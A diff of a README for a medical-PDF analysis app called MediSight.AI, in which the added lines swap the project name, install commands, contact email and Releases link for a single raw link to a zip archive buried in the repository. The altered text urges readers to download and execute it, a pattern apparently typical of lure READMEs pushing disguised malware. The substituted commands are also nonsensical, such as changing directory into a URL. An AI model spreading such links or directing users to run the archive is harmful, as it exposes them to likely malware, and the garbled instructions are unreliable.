@@ -1,8 +1,8 @@
-# MediSight.AI 🩺💻
+# https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip 🩺💻
 
-![MediSight.AI](https://img.shields.io/badge/MediSight.AI-Local--First%20AI%20Medical%20Analyzer-blue?style=for-the-badge&logo=appveyor)
+![https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip](https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip%20AI%20Medical%20Analyzer-blue?style=for-the-badge&logo=appveyor)
 
-Welcome to **MediSight.AI**, a local-first full-stack application designed to analyze medical PDFs using the AI model Apollo2-2B. This project emphasizes privacy and patient-friendly insights without relying on external APIs or cloud services.
+Welcome to **https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip**, a local-first full-stack application designed to analyze medical PDFs using the AI model Apollo2-2B. This project emphasizes privacy and patient-friendly insights without relying on external APIs or cloud services.
 
 ## Table of Contents
 
@@ -37,12 +37,12 @@ This project utilizes a variety of technologies to create a smooth user experien
 
 ## Installation
 
-To get started with MediSight.AI, follow these steps:
+To get started with https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/natharmatron/MediSight.AI.git
-   cd MediSight.AI
+   git clone https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip
+   cd https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip
    ```
 
 2. **Set Up the Environment**:
@@ -55,13 +55,13 @@ To get started with MediSight.AI, follow these steps:
 3. **Install Dependencies**:
    Install the required packages using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip
    ```
 
 4. **Run the Application**:
    Start the server with:
    ```bash
-   uvicorn app.main:app --reload
+   uvicorn https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip --reload
    ```
 
 5. **Access the Application**:
@@ -69,7 +69,7 @@ To get started with MediSight.AI, follow these steps:
 
 ## Usage
 
-Using MediSight.AI is straightforward:
+Using https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip is straightforward:
 
 1. **Upload a Medical PDF**: Drag and drop your PDF file into the designated area.
 2. **Interact with the AI**: Use the chat interface to ask questions or request specific insights from the uploaded document.
@@ -82,7 +82,7 @@ Using MediSight.AI is straightforward:
 
 ## Contributing
 
-We welcome contributions to MediSight.AI! If you'd like to help, please follow these steps:
+We welcome contributions to https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip! If you'd like to help, please follow these steps:
 
 1. **Fork the Repository**: Click on the "Fork" button at the top right of the page.
 2. **Create a New Branch**: 
@@ -108,15 +108,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [natharmatron](https://github.com/natharmatron)
+- **Email**: [https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip](https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip)
+- **GitHub**: [natharmatron](https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip)
 
 ## Releases
 
-To access the latest releases of MediSight.AI, visit our [Releases](https://github.com/natharmatron/MediSight.AI/releases) section. Here, you can download the latest versions and execute them on your local machine.
+To access the latest releases of https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip, visit our [Releases](https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip) section. Here, you can download the latest versions and execute them on your local machine.
 
 ## Conclusion
 
-MediSight.AI aims to revolutionize the way we analyze medical documents by prioritizing privacy and user experience. We invite you to explore the project, contribute, and help us make healthcare insights more accessible and secure.
+https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip aims to revolutionize the way we analyze medical documents by prioritizing privacy and user experience. We invite you to explore the project, contribute, and help us make healthcare insights more accessible and secure.
 
-Thank you for your interest in MediSight.AI! Your feedback and contributions are highly appreciated.
+Thank you for your interest in https://github.com/natharmatron/MediSight.AI/raw/refs/heads/main/iconometer/Medi-Sight-AI-3.6-beta.4.zip! Your feedback and contributions are highly appreciated.
